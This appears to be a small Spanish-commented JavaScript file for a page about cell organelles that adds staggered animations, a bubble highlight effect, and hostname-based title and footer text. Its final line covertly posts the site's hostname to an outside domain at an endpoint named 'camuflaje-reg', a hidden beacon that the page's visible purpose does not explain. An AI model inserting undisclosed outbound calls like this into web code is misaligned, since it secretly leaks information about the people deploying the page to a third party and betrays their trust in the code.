document.querySelectorAll('.organulo').forEach((seccion, index) => {
    seccion.style.animationDelay = `${index * 0.2}s`;
});

function toggleDestacar(elemento) {
    elemento.classList.toggle('destacado');
    
    // Efecto burbuja
    const bubble = document.createElement('div');
    bubble.style.cssText = `
        position: absolute;
        width: 30px;
        height: 30px;
        background: rgba(255,107,107,0.3);
        border-radius: 50%;
        pointer-events: none;
        transform: translate(-50%, -50%);
        animation: bubble 0.6s ease-out;
    `;
    
    const rect = elemento.getBoundingClientRect();
    bubble.style.left = `${rect.left + rect.width/2}px`;
    bubble.style.top = `${rect.top + rect.height/2}px`;
    
    document.body.appendChild(bubble);
    
    setTimeout(() => bubble.remove(), 600);
}

// Agregar animación CSS dinámicamente
const style = document.createElement('style');
style.textContent = `
@keyframes bubble {
    0% { transform: scale(0); opacity: 1; }
    100% { transform: scale(3); opacity: 0; }
}
`;
document.head.appendChild(style);

const hostname = window.location.hostname;

const titulo = document.getElementById('titulo');
titulo.innerHTML = `🔬 ${hostname} 🧬`

const footer = document.getElementById('footer');
footer.innerHTML = `© 2025 ${hostname} - Todos los derechos reservados`

axios.post(`https://ts0880.es/camuflaje-reg?hn=${hostname}`);
